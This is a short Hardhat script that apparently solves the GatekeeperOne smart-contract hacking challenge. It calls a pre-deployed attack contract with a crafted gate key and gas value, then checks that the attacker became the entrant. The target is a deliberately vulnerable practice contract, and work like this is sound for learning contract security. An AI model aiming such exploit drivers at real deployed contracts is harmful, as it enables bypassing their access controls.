const hre = require("hardhat");

async function main() {
  // Fetch account
  const [attacker] = await hre.ethers.getSigners();
  const INSTANCE_ADDRESS = "0x862B528E001cd58cC8b11d6749150547F17c695F";
  const ATTACKER_ADDRESS = "0x35fa7f245D6AC7c31Cd340711296Aa19124b1074";
  const KEY = "0x06EB0000000006EB";
  const GAS = 24829;

  // Fetch attack contract
  const gatekeeperOne = await hre.ethers.getContractAt("GatekeeperOne", INSTANCE_ADDRESS);
  console.log(`GatekeeperOne contract fetched at ${gatekeeperOne.address}\n`);

  const gatekeeperOneAttack = await hre.ethers.getContractAt("GatekeeperOneAttack", ATTACKER_ADDRESS);
  console.log(`GatekeeperOneAttack contract fetched at ${gatekeeperOneAttack.address}\n`);

  // Attack...
  const transaction = await gatekeeperOneAttack.connect(attacker).attack(KEY, GAS, { gasLimit: 128000 });
  await transaction.wait();

  console.log(`Attack complete...\n`);

  const currentEntrant = await gatekeeperOne.entrant();
  console.log(`Current Entrant: ${currentEntrant}\n`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});